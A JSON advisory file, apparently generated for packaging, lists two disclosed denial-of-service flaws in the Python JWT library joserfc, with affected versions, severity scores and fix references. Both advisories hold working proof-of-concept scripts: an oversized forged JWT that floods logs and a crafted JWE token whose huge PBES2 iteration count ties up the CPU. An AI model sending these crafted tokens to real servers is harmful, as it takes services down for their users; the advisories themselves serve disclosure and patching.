@@ -1,0 +1,219 @@
+{
+  "schema_version": 1,
+  "package": "joserfc",
+  "purls": [
+    "pkg:pypi/joserfc"
+  ],
+  "generated_at": "2026-05-18T06:01:40+00:00",
+  "conda_versions_total": 29,
+  "advisories": [
+    {
+      "id": "GHSA-frfh-8v73-gjg4",
+      "primary_id": "CVE-2025-65015",
+      "aliases": [
+        "CVE-2025-65015"
+      ],
+      "cve_ids": [
+        "CVE-2025-65015"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "joserfc",
+      "summary": "joserfc has Possible Uncontrolled Resource Consumption Vulnerability Triggered by Logging Arbitrarily Large JWT Token Payloads",
+      "details": "### Summary\nThe `ExceededSizeError` exception messages are embedded with non-decoded JWT token parts and may cause Python logging to record an arbitrarily large, forged JWT payload.\n\n### Details\nIn situations where a misconfigured \u2014 or entirely absent \u2014 production-grade web server sits in front of a Python web application, an attacker may be able to send arbitrarily large bearer tokens in the HTTP request headers. When this occurs, Python logging or diagnostic tools (e.g., Sentry) may end up processing extremely large log messages containing the full JWT header during the `joserfc.jwt.decode()` operation. The same behavior also appears when validating claims and signature payload sizes, as the library raises `joserfc.errors.ExceededSizeError()` with the full payload embedded in the exception message. Since the payload is already fully loaded into memory at this stage, the library cannot prevent or reject it per se.\n\nIt is therefore the responsibility of the underlying web server (`uvicorn`/`h11`, `gunicorn`, `Starlette`, `Werkzeug`, `nginx`...etc) to enforce limits on header sizes. For example, a `FastAPI`/`Starlette` application running _without_ `uvicorn` and/or `gunicorn` cannot enforce header size limits on its own. With `uvicorn`/`h11`, the [--h11-max-incomplete-event-size <int>](https://uvicorn.dev/settings/#implementation:~:text=%2D%2Dh11%2Dmax%2Dincomplete%2Devent%2Dsize%20%3Cint%3E) option can restrict the total size of the header _plus_ body, but not the header alone. Similarly, [vLLM serve](https://docs.vllm.ai/en/latest/cli/serve/#-h11-max-incomplete-event-size) \u2014due to its reliance on `uvicorn`/`h11` and the need for heavy data transfer in ML inference workloads, sets a default limit of 4 MB for header _plus_ body and is frequently increased. In practice, a robust reverse proxy (such as `nginx`) is typically required because it can explicitly cap maximum header size. Unfortunately, many web applications do not run behind a proper reverse proxy.\n\nGiven these constraints, the `joserfc` library cannot safely log or embed payloads of arbitrary size. This issue is particularly subtle, as it occurs only when a maliciously crafted JWT finally reaches the Python application, a scenario that most developers will never encounter during routine development and testing.\n\n### PoC\n**Environment**\nUbuntu 24.04 LTS\nPython 3.12\nTested on `joserfc` version `1.4.1`\n\n```python\n\nimport logging\nfrom datetime import UTC, datetime, timedelta\n\nfrom joserfc import jwt\nfrom joserfc.errors import ExceededSizeError, UnsupportedAlgorithmError\nfrom joserfc.jwk import OctKey\n\n\nlogger = logging.getLogger(__name__)\n\n\nSECRET_KEY = \"8c13bd66babc241b29f8553429bdab7deb6f5b74ddfda7765471e57ecd55641e\"\nLONG_JWT_TOKEN = (\n    \"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGQifQ\"\n    \".\"\n    \"eyJpc3MiOiJhdXRoX3NlcnZlciIsImlhdCI6MTc2MzI0OTEwMSwiZXhwIjoxNzY5MjQ5MTAxfQ\"\n    \".\"\n    \"6-k2jmkGXD6wXOgYgjPS8E5lS_GjWpgIuY54gokjAn8\"\n)\n\nHEADER = {\n    \"alg\": (\n        \"RS256dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd\"\n        \"RS256dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd\"\n        \"RS256dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd\"\n        \"RS256dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd\"\n        \"RS256dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd\"\n        \"RS256dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd\"\n    ),\n}\nCLAIMS = {\n    \"iss\": \"auth_server\",\n    \"iat\": datetime.now(UTC),\n    \"exp\": datetime.now(UTC) + timedelta(minutes=15),\n}\n\n\ndef main():\n    # Create OctKey from SECRET_KEY\n    key = OctKey.import_key(SECRET_KEY)\n\n    # Simulate creating a very large JWT\n    # (this will fail with joserfc.errors.UnsupportedAlgorithmError\n    # due to an invalid 'alg' header content\n    try:\n        token = jwt.encode(HEADER, CLAIMS, key)\n    except UnsupportedAlgorithmError:\n        # Use a forged token that has the same header and claims instead\n        # but an invalid signature\n        token = LONG_JWT_TOKEN\n    logger.warning(f\"Created JWT: {token}\")\n\n    # Now try to decode the large JWT\n    try:\n        decoded_token = jwt.decode(token, key)\n        logger.warning(\"This line will never be reached.\")\n        logger.warning(decoded_token.claims)\n    except ExceededSizeError:\n        logger.exception(\n            \"The JWT size is too large and may be a security attack attempt.\"\n        )\n        # this is logging the whole header content in the exception message!\n\n```\n```\nCreated JWT: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGQifQ.eyJpc3MiOiJhdXRoX3NlcnZlciIsImlhdCI6MTc2MzI0OTEwMSwiZXhwIjoxNzY5MjQ5MTAxfQ.6-k2jmkGXD6wXOgYgjPS8E5lS_GjWpgIuY54gokjAn8\nThe JWT size is too large and may be a security attack attempt.\nTraceback (most recent call last):\n  File \"security_issue.py\", line 55, in main\n    claims = jwt.decode(token, key)\n             ^^^^^^^^^^^^^^^^^^^^^^\n  File \".venv/lib/python3.12/site-packages/joserfc/jwt.py\", line 106, in decode\n    header, payload = _decode_jws(_value, key, algorithms, registry)\n                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \".venv/lib/python3.12/site-packages/joserfc/jwt.py\", line 127, in _decode_jws\n    jws_obj = deserialize_compact(value, key, algorithms, registry)\n              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \".venv/lib/python3.12/site-packages/joserfc/jws.py\", line 183, in deserialize_compact\n    obj = extract_compact(to_bytes(value), payload, registry)\n          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \".venv/lib/python3.12/site-packages/joserfc/_rfc7797/compact.py\", line 50, in extract_rfc7515_compact\n    registry.validate_header_size(header_segment)\n  File \".venv/lib/python3.12/site-packages/joserfc/_rfc7515/registry.py\", line 104, in validate_header_size\n    raise ExceededSizeError(f\"Header size of '{header!r}' exceeds {self.max_header_length} bytes.\")\njoserfc.errors.ExceededSizeError: exceeded_size: Header size of 'b'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRSUzI1NmRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGQifQ'' exceeds 512 bytes.\n\n```\n\n## Code location\nThis behavior occurs in:\n\n**`joserfc/_rfc7515/registry.py`**\n**L102-112**\n```python\n    def validate_header_size(self, header: bytes) -> None:\n        if header and len(header) > self.max_header_length:\n            raise ExceededSizeError(f\"Header size of '{header!r}' exceeds {self.max_header_length} bytes.\")\n\n    def validate_payload_size(self, payload: bytes) -> None:\n        if payload and len(payload) > self.max_payload_length:\n            raise ExceededSizeError(f\"Payload size of '{payload!r}' exceeds {self.max_payload_length} bytes.\")\n\n    def validate_signature_size(self, signature: bytes) -> None:\n        if len(signature) > self.max_signature_length:\n            raise ExceededSizeError(f\"Signature of '{signature!r}' exceeds {self.max_signature_length} bytes.\")\n```\n**`joserfc/_rfc7516/registry.py`**\n**L103-123**\n```python\n    def validate_protected_header_size(self, header: bytes) -> None:\n        if header and len(header) > self.max_protected_header_length:\n            raise ExceededSizeError(f\"Header size of '{header!r}' exceeds {self.max_protected_header_length} bytes.\")\n\n    def validate_encrypted_key_size(self, ek: bytes) -> None:\n        if ek and len(ek) > self.max_encrypted_key_length:\n            raise ExceededSizeError(f\"Encrypted key size of '{ek!r}' exceeds {self.max_encrypted_key_length} bytes.\")\n\n    def validate_initialization_vector_size(self, iv: bytes) -> None:\n        if iv and len(iv) > self.max_initialization_vector_length:\n            raise ExceededSizeError(\n                f\"Initialization vector size of '{iv!r}' exceeds {self.max_initialization_vector_length} bytes.\"\n            )\n\n    def validate_ciphertext_size(self, ciphertext: bytes) -> None:\n        if ciphertext and len(ciphertext) > self.max_ciphertext_length:\n            raise ExceededSizeError(f\"Ciphertext size of '{ciphertext!r}' exceeds {self.max_ciphertext_length} bytes.\")\n\n    def validate_auth_tag_size(self, tag: bytes) -> None:\n        if tag and len(tag) > self.max_auth_tag_length:\n            raise ExceededSizeError(f\"Auth tag size of '{tag!r}' exceeds {self.max_auth_tag_length} bytes.\")\n```\nAnother occurrence of `ExceededSizeError` in **`joserfc/_rfc7518/jwe_zips.py`** is not affected\nby this issue as it does not include the payload content in the exception message.\n\n### Impact\nIn scenarios where a web application does not reject excessively large HTTP header payloads, using `joserfc` can expose the system to an **Allocation of Resources Without Limits or Throttling** (CWE-770), potentially impacting disk, memory, and CPU on the application host, as well as any external log storage, ingestion pipelines or alerting services. This risk can be mitigated by removing the JWT payload from the logged content in some `joserfc.errors.ExceededSizeError()` exception message occurrences. It would also be beneficial for the documentation to advise deploying the library behind a robust web server or reverse proxy that correctly enforces maximum request header sizes.",
+      "published": "2025-11-18T18:26:04Z",
+      "modified": "2026-02-04T02:53:15.049381Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/authlib/joserfc/security/advisories/GHSA-frfh-8v73-gjg4"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-65015"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/authlib/joserfc/commit/63932f169d924caffafa761af2122b82059017f7"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/authlib/joserfc/commit/673c8743fd0605b0e1de6452be6cba75f44e466b"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/authlib/joserfc"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/authlib/joserfc/releases/tag/1.3.5"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/authlib/joserfc/releases/tag/1.4.2"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-frfh-8v73-gjg4",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "1.3.3"
+            },
+            {
+              "fixed": "1.3.5"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "1.3.3",
+        "1.3.4"
+      ],
+      "affected_conda_versions": [
+        "1.3.3",
+        "1.3.4",
+        "1.4.0",
+        "1.4.1"
+      ]
+    },
+    {
+      "id": "GHSA-w5r5-m38g-f9f9",
+      "primary_id": "CVE-2026-27932",
+      "aliases": [
+        "CVE-2026-27932"
+      ],
+      "cve_ids": [
+        "CVE-2026-27932"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "joserfc",
+      "summary": "joserfc's PBES2 p2c Unbounded Iteration Count enables Denial of Service (DoS)",
+      "details": "# Summary \n\nA resource exhaustion vulnerability in joserfc allows an unauthenticated attacker to cause a Denial of Service (DoS) via CPU exhaustion. When the library decrypts a JSON Web Encryption (JWE) token using Password-Based Encryption (PBES2) algorithms, it reads the p2c (PBES2 Count) parameter directly from the token's protected header. This parameter defines the number of iterations for the PBKDF2 key derivation function. Because joserfc does not validate or bound this value, an attacker can specify an extremely large iteration count (e.g., 2^31 - 1), forcing the server to expend massive CPU resources processing a single token.\n\nThis vulnerability exists at the JWA layer and impacts all high-level JWE and JWT decryption interfaces if PBES2 algorithms are allowed by the application's policy.\n\n## Details\n \n**Vulnerable file:** `src/joserfc/_rfc7518/jwe_algs.py`\n**Vulnerable function:** `PBES2HSAlgKeyEncryption.decrypt_cek()` \n**Lines:** 283\n\n```python\ndef decrypt_cek(self, recipient: Recipient[OctKey]) -> bytes:\n    headers = recipient.headers()\n    # ...\n    p2c = headers[\"p2c\"]  # \u2190 attacker-controlled integer\n    # ...\n    kek = self.compute_derived_key(key.get_op_key(\"deriveKey\"), p2s, p2c)\n```\nThe `p2c` value is then passed to `compute_derived_key` : \n\n```python\ndef compute_derived_key(self, key: bytes, p2s: bytes, p2c: int) -> bytes:\n    # ...\n    kdf = PBKDF2HMAC(\n        algorithm=self.hash_alg,\n        length=self.key_size // 8,\n        salt=salt,\n        iterations=p2c,  # \u2190 unbounded iterations\n        backend=default_backend(),\n    )\n```\n\n**Impact on JWT Policies**\nAny JWT policy configured to allow PBES2 key management algorithms (e.g., `PBES2-HS256+A128KW`) is vulnerable. Because the DoS occurs during the decryption phase, the attack is triggered before any claim validation (e.g., \nexp,`iss, aud` checks) or nested signature verification takes place. This makes existing JWT \"policies\" ineffective as a defense if the underlying algorithm is permitted.\n\n\n## PoC\n\n**Tested against joserfc 1.6.2.\nLocal Reproduction:**\n\n```python\nimport time\nfrom joserfc import jwe\nfrom joserfc.jwk import OctKey\n\n# Force joserfc to use local source if needed\n# sys.path.insert(0, \"src\")\n\n# Attacker-crafted token with 10 million iterations\n# Normally legitimate p2c is ~2048-4096. 10M iterations = ~5s DoS.\ntoken = \"eyJhbGciOiJQQkVTMi1IUzI1NitBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwicDJzIjoiWjI5dVpYSm1ZdyIsInAyYyI6MTAwMDAwMDB9.dummy.dummy.dummy.dummy\"\n\nkey = OctKey.import_key(b\"any-password\")\n\nt0 = time.perf_counter()\ntry:\n    # This call will hang the thread for seconds\n    jwe.decrypt_compact(token, key, algorithms=[\"PBES2-HS256+A128KW\", \"A128CBC-HS256\"])\nexcept Exception:\n    pass\nprint(f\"Elapsed: {time.perf_counter() - t0:.2f}s\")\n```\n\n## Impact\nAn unauthenticated remote attacker can exhaust the CPU resources of a server by sending a small number of crafted JWE/JWT tokens. Each token will occupy a worker thread/process for a duration proportional to the `p2c` value (up to several minutes or hours depending on the integer value). This results in a complete Denial of Service for legitimate users.\n\n## Recommendation\nMinimal fix: Implement an upper bound check for the `p2c` parameter in `PBES2HSAlgKeyEncryption.decrypt_cek()`.\n\n```python\nMAX_P2C = 300000  # Example security bound\n\n# ... inside decrypt_cek ...\np2c = headers[\"p2c\"]\nif not isinstance(p2c, int) or p2c > MAX_P2C:\n    raise DecodeError(f\"p2c iteration count too high (max {MAX_P2C})\")\n```\nAdditionally, applications should only enable PBES2 algorithms if password-based encryption is specifically required and should enforce a strict  algorithms allowlist in their JWT/JWE policies.",
+      "published": "2026-03-02T18:47:37Z",
+      "modified": "2026-03-10T21:44:01.693108Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/authlib/joserfc/security/advisories/GHSA-w5r5-m38g-f9f9"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-27932"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/authlib/joserfc/commit/696a961"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/authlib/joserfc/commit/696a9611ab982c45ee2190ed79ca8e1d8e09398f"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/authlib/joserfc"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-w5r5-m38g-f9f9",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.6.3"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1.0",
+        "0.10.0",
+        "0.11.0",
+        "0.11.1",
+        "0.12.0",
+        "0.2.0",
+        "0.3.0",
+        "0.4.0",
+        "0.5.0",
+        "0.6.0",
+        "0.7.0",
+        "0.8.0",
+        "0.9.0",
+        "1.0.0",
+        "1.0.1",
+        "1.0.2",
+        "1.0.3",
+        "1.0.4",
+        "1.1.0",
+        "1.2.0",
+        "1.2.1",
+        "1.2.2",
+        "1.3.0",
+        "1.3.1",
+        "1.3.2",
+        "1.3.3",
+        "1.3.4",
+        "1.3.5",
+        "1.4.0",
+        "1.4.1",
+        "1.4.2",
+        "1.4.3",
+        "1.5.0",
+        "1.6.0",
+        "1.6.1",
+        "1.6.2"
+      ],
+      "affected_conda_versions": [
+        "0.9.0",
+        "0.10.0",
+        "0.11.1",
+        "0.12.0",
+        "1.0.0",
+        "1.0.1",
+        "1.0.2",
+        "1.0.3",
+        "1.0.4",
+        "1.1.0",
+        "1.2.0",
+        "1.2.1",
+        "1.2.2",
+        "1.3.0",
+        "1.3.1",
+        "1.3.2",
+        "1.3.3",
+        "1.3.4",
+        "1.4.0",
+        "1.4.1",
+        "1.4.2",
+        "1.4.3",
+        "1.5.0",
+        "1.6.0",
+        "1.6.1",
+        "1.6.2"
+      ]
+    }
+  ]
+}
